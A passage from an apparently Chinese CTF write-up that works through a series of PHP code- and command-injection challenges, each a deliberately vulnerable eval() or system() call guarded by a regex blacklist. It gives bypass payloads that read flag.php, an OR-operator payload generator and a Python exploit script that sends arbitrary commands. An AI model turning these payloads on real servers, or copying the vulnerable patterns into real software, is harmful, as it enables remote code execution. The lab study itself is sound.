函数返回一包含本地数字及货币格式信息的数组。其中第一个字符为点</p><p>而点在linux中代表的就是当前目录</p><p><img src="/posts/999021e8/image-20220327200944517.png" alt="image-20220327200944517"></p><p><code>pos()</code> 输出数组中的当前元素的值也就是输出当前指针执行的元素 而指针初始执行第一个元素</p><p><code>pos(localeconv())</code>的输出内容就是点</p><p><code>scandir()</code> 函数返回指定目录中的文件和目录的数组。</p><p><code>scandir(pos(localeconv()))</code>返回当前目录的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure><p>查看当前目录有啥</p><p><img src="/posts/999021e8/image-20220327201715160.png" alt="image-20220327201715160"></p><p>可以看到flag.php在倒数第二个位置</p><p><code>array_reverse()</code> 函数以相反的元素顺序返回数组</p><p><code>array_reverse(scandir(pos(localeconv())))</code> 这里就是把flag.php放到第二个位置方便接下来的操作</p><p><code>next()</code> 函数将内部指针指向数组中的下一个元素，并输出。</p><p><code>next(array_reverse(scandir(pos(localeconv()))))</code>到这里指针就指到了flag.php</p><p><code>highlight_file()</code> 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。同时整个文件也会显示出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#最终payload</span></span><br><span class="line">?c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line">或者</span><br><span class="line"><span class="comment">#pos()与current()作用相同 readfile()与作用相同highlight_file()</span></span><br><span class="line">?c=<span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"><span class="comment">#show_source()与作用相同highlight_file()</span></span><br><span class="line">?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><h3 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;a=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>详情可看上文中链接文章</p><p>首先<code>get_defined_vars()</code>函数可以回显全局变量</p><p><img src="/posts/999021e8/image-20220327220213016.png" alt="image-20220327220213016"></p><p>我们想办法把通过这些变量构造RCE 通过&amp;_GET传入数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(pos(get_defined_vars()));&amp;sky=123</span><br></pre></td></tr></table></figure><p><img src="/posts/999021e8/image-20220327221419894.png" alt="image-20220327221419894"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(end(pos(get_defined_vars())));&amp;sky=123</span><br></pre></td></tr></table></figure><p><img src="/posts/999021e8/image-20220327221518318.png" alt="image-20220327221518318"></p><p>成功取出</p><p>接下来就是构造RCE了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;a=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="Web41"><a href="#Web41" class="headerlink" title="Web41"></a>Web41</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这次过滤所有字母和数字以及一堆符号 但是留下了一个或运算符 <code>|</code> </p><p>这里可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。</p><p>感谢yu22x师傅提供的脚本 <a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成可用字符的集合</span></span><br><span class="line"><span class="comment"># rce_or.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用法python exp.py &lt;url&gt;</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br></pre></td></tr></table></figure><p><img src="/posts/999021e8/image-20220328115853461.png" alt="image-20220328115853461"></p><p>your function输入需要执行的函数</p><p>your command输入需要执行的命令</p><h2 id="We42"><a href="#We42" class="headerlink" title="We42"></a>We42</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>&gt;/dev/null 2&gt;&amp;1</code>的意思是 将参数返回的结果重定向到黑洞文件</p><blockquote><p>&#x2F;dev&#x2F;null文件可以被看作是一个“黑洞”文件。它等价于一个只写的的文件。所有写入它的内容都会永远丢失(因为不可读)。</p></blockquote><p>这里我们可以使用双命令绕过,使第一条命令执行，第二条命令被重定向到黑洞文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=cat flag.php;</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web43"><a href="#Web43" class="headerlink" title="Web43"></a>Web43</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>过滤了cat和；</p><p>使用 | 代替；</p><p>cat用nl或者tac代替</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl flag.php||</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web44"><a href="#Web44" class="headerlink" title="Web44"></a>Web44</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>又过滤了flag</p><p>可以使用通配符绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl fla*||</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web45"><a href="#Web45" class="headerlink" title="Web45"></a>Web45</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>多了空格的过滤</p><p>用%09或者&lt;绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl%09fla*||</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web46"><a href="#Web46" class="headerlink" title="Web46"></a>Web46</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>多过滤了$ * 和数字</p><p>使用?绕过对*的过滤</p><blockquote><p><code>&quot;?&quot;和&quot;*&quot;的区别：</code></p><p><code>?只能通配某个字符，如flag.php -&gt; fla?.php fl??.ph?</code></p><p><code>*可以通配整个字符串，如flag.php -&gt; f*</code></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl%09fl?g.php||</span><br></pre></td></tr></table></figure><p>这里%09还能用是因为参数验证前进行了url解码 %09 变成了tab字符</p><p>查看源代码获取flag</p><h2 id="Web47"><a href="#Web47" class="headerlink" title="Web47"></a>Web47</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>多了more less head sort tail</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl%09fl?g.php||</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web48"><a href="#Web48" class="headerlink" title="Web48"></a>Web48</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>多了sed cut awk strings od curl</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl%09fl?g.php||</span><br></pre></td></tr></table></figure><h2 id="Web49"><a href="#Web49" class="headerlink" title="Web49"></a>Web49</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>多了&#96; 和 %</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl%09fl?g.php||</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web50"><a href="#Web50" class="headerlink" title="Web50"></a>Web50</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>多了x09 x26</p><p>%09不能用了换成&lt; </p><p>nl不支持通配符使用引号分割</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl&lt;fl&#x27;&#x27;ag.php||</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web51"><a href="#Web51" class="headerlink" title="Web51"></a>Web51</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span 